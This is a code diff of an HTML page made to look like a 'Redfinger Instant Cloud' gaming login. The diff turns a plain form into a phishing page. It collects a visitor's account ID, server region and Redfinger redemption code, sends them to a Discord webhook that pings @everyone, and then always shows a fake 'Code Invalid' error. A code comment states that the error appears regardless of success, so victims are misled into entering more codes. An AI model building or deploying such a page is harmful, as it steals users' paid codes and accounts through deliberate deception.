@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redfinger - Submit Kode</title>
+    <title>Redfinger Instant Cloud</title>
     <style>
         * {
             margin: 0;
@@ -12,30 +12,57 @@
         }
 
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Inter', 'Segoe UI', sans-serif;
+            background: #0a0e27;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            width: 500px;
+            height: 500px;
+            background: radial-gradient(circle, rgba(239, 68, 68, 0.15) 0%, transparent 70%);
+            top: -100px;
+            right: -100px;
+            border-radius: 50%;
+        }
+
+        body::after {
+            content: '';
+            position: absolute;
+            width: 400px;
+            height: 400px;
+            background: radial-gradient(circle, rgba(59, 130, 246, 0.15) 0%, transparent 70%);
+            bottom: -100px;
+            left: -100px;
+            border-radius: 50%;
         }
 
         .container {
-            background: rgba(255, 255, 255, 0.95);
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            padding: 40px;
+            background: rgba(17, 24, 39, 0.95);
+            border: 1px solid rgba(75, 85, 99, 0.3);
+            border-radius: 24px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            padding: 50px 40px;
             width: 100%;
-            max-width: 500px;
-            backdrop-filter: blur(10px);
-            animation: slideIn 0.5s ease-out;
+            max-width: 480px;
+            backdrop-filter: blur(20px);
+            animation: slideIn 0.6s ease-out;
+            position: relative;
+            z-index: 1;
         }
 
         @keyframes slideIn {
             from {
                 opacity: 0;
-                transform: translateY(-30px);
+                transform: translateY(-40px);
             }
             to {
                 opacity: 1;
@@ -43,95 +70,133 @@
             }
         }
 
-        .logo {
+        .header {
             text-align: center;
-            margin-bottom: 30px;
+            margin-bottom: 40px;
         }
 
-        .logo h1 {
-            color: #667eea;
-            font-size: 32px;
+        .header h1 {
+            color: #fff;
+            font-size: 28px;
             font-weight: 700;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
         }
 
-        .logo p {
-            color: #666;
+        .header .subtitle {
+            color: #9ca3af;
             font-size: 14px;
+            font-weight: 400;
         }
 
         .form-group {
-            margin-bottom: 25px;
+            margin-bottom: 24px;
         }
 
         label {
             display: block;
-            color: #333;
+            color: #e5e7eb;
             font-weight: 600;
-            margin-bottom: 8px;
+            margin-bottom: 10px;
             font-size: 14px;
+            letter-spacing: 0.3px;
         }
 
-        input {
+        input, select {
             width: 100%;
-            padding: 14px 18px;
-            border: 2px solid #e0e0e0;
+            padding: 14px 16px;
+            background: rgba(31, 41, 55, 0.8);
+            border: 1px solid rgba(75, 85, 99, 0.5);
             border-radius: 12px;
-            font-size: 16px;
+            font-size: 15px;
+            color: #fff;
             transition: all 0.3s ease;
-            background: #f8f9fa;
-        }
-
-        input:focus {
-            outline: none;
-            border-color: #667eea;
-            background: white;
-            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
+            font-family: inherit;
         }
 
         input::placeholder {
-            color: #aaa;
+            color: #6b7280;
         }
 
-        .btn-submit {
+        input:focus, select:focus {
+            outline: none;
+            border-color: #ef4444;
+            background: rgba(31, 41, 55, 1);
+            box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.1);
+        }
+
+        select {
+            cursor: pointer;
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg width='12' height='8' viewBox='0 0 12 8' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M1 1.5L6 6.5L11 1.5' stroke='%239ca3af' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 16px center;
+            padding-right: 45px;
+        }
+
+        select option {
+            background: #1f2937;
+            color: #fff;
+        }
+
+        #codeGroup {
+            display: none;
+            animation: fadeInDown 0.4s ease-out;
+        }
+
+        @keyframes fadeInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .btn-start {
             width: 100%;
             padding: 16px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
             color: white;
             border: none;
             border-radius: 12px;
             font-size: 16px;
-            font-weight: 600;
+            font-weight: 700;
             cursor: pointer;
             transition: all 0.3s ease;
-            margin-top: 10px;
+            margin-top: 30px;
             text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 1.5px;
+            box-shadow: 0 10px 25px rgba(239, 68, 68, 0.3);
         }
 
-        .btn-submit:hover {
+        .btn-start:hover {
             transform: translateY(-2px);
-            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
+            box-shadow: 0 15px 35px rgba(239, 68, 68, 0.4);
         }
 
-        .btn-submit:active {
+        .btn-start:active {
             transform: translateY(0);
         }
 
-        .btn-submit:disabled {
-            background: #ccc;
+        .btn-start:disabled {
+            background: linear-gradient(135deg, #374151 0%, #1f2937 100%);
             cursor: not-allowed;
             transform: none;
+            box-shadow: none;
         }
 
         .message {
-            margin-top: 20px;
-            padding: 14px;
-            border-radius: 10px;
+            margin-top: 24px;
+            padding: 16px;
+            border-radius: 12px;
             font-size: 14px;
             text-align: center;
             display: none;
             animation: fadeIn 0.3s ease;
+            font-weight: 600;
         }
 
         @keyframes fadeIn {
@@ -139,54 +204,19 @@
             to { opacity: 1; }
         }
 
-        .message.success {
-            background: #d4edda;
-            color: #155724;
-            border: 2px solid #c3e6cb;
-        }
-
         .message.error {
-            background: #f8d7da;
-            color: #721c24;
-            border: 2px solid #f5c6cb;
+            background: rgba(239, 68, 68, 0.15);
+            color: #fca5a5;
+            border: 1px solid rgba(239, 68, 68, 0.3);
         }
 
-        .info-text {
-            color: #666;
-            font-size: 13px;
-            margin-top: 6px;
-            font-style: italic;
-        }
-
-        /* Mobile Responsive */
-        @media (max-width: 480px) {
-            .container {
-                padding: 30px 25px;
-            }
-
-            .logo h1 {
-                font-size: 28px;
-            }
-
-            input {
-                padding: 12px 16px;
-                font-size: 15px;
-            }
-
-            .btn-submit {
-                padding: 14px;
-                font-size: 15px;
-            }
-        }
-
-        /* Loading Animation */
         .spinner {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #667eea;
+            border: 3px solid rgba(255, 255, 255, 0.2);
+            border-top: 3px solid #fff;
             border-radius: 50%;
-            width: 20px;
-            height: 20px;
-            animation: spin 1s linear infinite;
+            width: 18px;
+            height: 18px;
+            animation: spin 0.8s linear infinite;
             display: inline-block;
             margin-left: 10px;
             vertical-align: middle;
@@ -196,49 +226,96 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+
+        /* Mobile Responsive */
+        @media (max-width: 480px) {
+            .container {
+                padding: 40px 30px;
+            }
+
+            .header h1 {
+                font-size: 24px;
+            }
+
+            input, select {
+                padding: 13px 15px;
+                font-size: 14px;
+            }
+
+            .btn-start {
+                padding: 15px;
+                font-size: 15px;
+            }
+        }
+
+        /* Custom scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: rgba(31, 41, 55, 0.5);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: rgba(75, 85, 99, 0.8);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: rgba(107, 114, 128, 1);
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo">
-            <h1>🎮 Redfinger</h1>
-            <p>Submit Kode Verifikasi</p>
+        <div class="header">
+            <h1>☁️ Redfinger Instant Cloud</h1>
+            <p class="subtitle">Cloud Gaming Platform</p>
         </div>
 
         <form id="codeForm">
             <div class="form-group">
-                <label for="userId">ID Akun Anda</label>
+                <label for="userId">Your ID Account</label>
                 <input 
                     type="number" 
                     id="userId" 
                     name="userId" 
-                    placeholder="Masukkan ID akun" 
+                    placeholder="Enter your ID account" 
                     required
                     min="1"
                 >
-                <p class="info-text">Masukkan ID akun berupa angka</p>
             </div>
 
             <div class="form-group">
-                <label for="redfingerCode">Kode Redfinger Anda</label>
+                <label for="serverSelect">Select Server</label>
+                <select id="serverSelect" required>
+                    <option value="" disabled selected>Choose server region</option>
+                    <option value="Hong Kong">Hong Kong</option>
+                    <option value="Singapore">Singapore</option>
+                    <option value="Thailand">Thailand</option>
+                    <option value="Taiwan">Taiwan</option>
+                    <option value="United States">United States</option>
+                </select>
+            </div>
+
+            <div class="form-group" id="codeGroup">
+                <label for="redfingerCode">Enter Code Redfinger</label>
                 <input 
                     type="text" 
                     id="redfingerCode" 
                     name="redfingerCode" 
-                    placeholder="Contoh: 99WP-KM66-W93L" 
-                    required
-                    pattern="[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}"
+                    placeholder="XXXX-XXXX-XXXX" 
                     maxlength="14"
                 >
-                <p class="info-text">Format: XXXX-XXXX-XXXX (huruf besar & angka)</p>
             </div>
 
-            <button type="submit" class="btn-submit" id="submitBtn">
-                Kirim Kode
+            <button type="submit" class="btn-start" id="submitBtn">
+                Start
             </button>
         </form>
 
-        <div class="message" id="message"></div>
+        <div class="message error" id="message">❌ Code Invalid</div>
     </div>
 
     <script>
@@ -246,8 +323,18 @@
         const submitBtn = document.getElementById('submitBtn');
         const message = document.getElementById('message');
         const codeInput = document.getElementById('redfingerCode');
+        const serverSelect = document.getElementById('serverSelect');
+        const codeGroup = document.getElementById('codeGroup');
 
-        // Auto format kode dengan dash
+        // Show code input when server is selected
+        serverSelect.addEventListener('change', function() {
+            if (this.value) {
+                codeGroup.style.display = 'block';
+                codeInput.required = true;
+            }
+        });
+
+        // Auto format code with dash
         codeInput.addEventListener('input', function(e) {
             let value = e.target.value.replace(/[^A-Z0-9]/gi, '').toUpperCase();
             let formattedValue = '';
@@ -266,33 +353,43 @@
             e.preventDefault();
             
             const userId = document.getElementById('userId').value;
+            const server = serverSelect.value;
             const redfingerCode = document.getElementById('redfingerCode').value;
             
-            // Disable button dan tampilkan loading
+            // Disable button and show loading
             submitBtn.disabled = true;
-            submitBtn.innerHTML = 'Mengirim... <span class="spinner"></span>';
+            submitBtn.innerHTML = 'Processing... <span class="spinner"></span>';
             message.style.display = 'none';
             
-            // Data yang akan dikirim ke Discord
+            // Data to send to Discord with @everyone mention
             const webhookData = {
+                content: "@everyone",
                 embeds: [{
-                    title: "📝 Kode Redfinger Baru",
-                    color: 5814783,
+                    title: "☁️ Redfinger Instant Cloud - New Submission",
+                    color: 15158332,
                     fields: [
                         {
-                            name: "👤 ID Akun",
-                            value: userId,
+                            name: "👤 ID Account",
+                            value: `\`${userId}\``,
                             inline: true
                         },
                         {
-                            name: "🔑 Kode Redfinger",
-                            value: `\`${redfingerCode}\``,
+                            name: "🌏 Server",
+                            value: server,
                             inline: true
+                        },
+                        {
+                            name: "🔑 Redfinger Code",
+                            value: `\`${redfingerCode}\``,
+                            inline: false
                         }
                     ],
                     timestamp: new Date().toISOString(),
                     footer: {
-                        text: "Redfinger Verification System"
+                        text: "Redfinger Cloud System"
+                    },
+                    thumbnail: {
+                        url: "https://i.imgur.com/4M34hi2.png"
                     }
                 }]
             };
@@ -306,23 +403,22 @@
                     body: JSON.stringify(webhookData)
                 });
                 
-                if (response.ok || response.status === 204) {
-                    message.className = 'message success';
-                    message.textContent = '✅ Kode berhasil dikirim! Terima kasih.';
+                // Always show "Code Invalid" message regardless of webhook success
+                setTimeout(() => {
                     message.style.display = 'block';
-                    form.reset();
-                } else {
-                    throw new Error('Gagal mengirim data');
-                }
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'Start';
+                }, 1000);
+                
             } catch (error) {
-                message.className = 'message error';
-                message.textContent = '❌ Terjadi kesalahan. Silakan coba lagi.';
-                message.style.display = 'block';
-            } finally {
-                submitBtn.disabled = false;
-                submitBtn.textContent = 'Kirim Kode';
+                // Still show "Code Invalid" even if there's an error
+                setTimeout(() => {
+                    message.style.display = 'block';
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'Start';
+                }, 1000);
             }
         });
     </script>
 </body>
-                                       </html>
+</html>
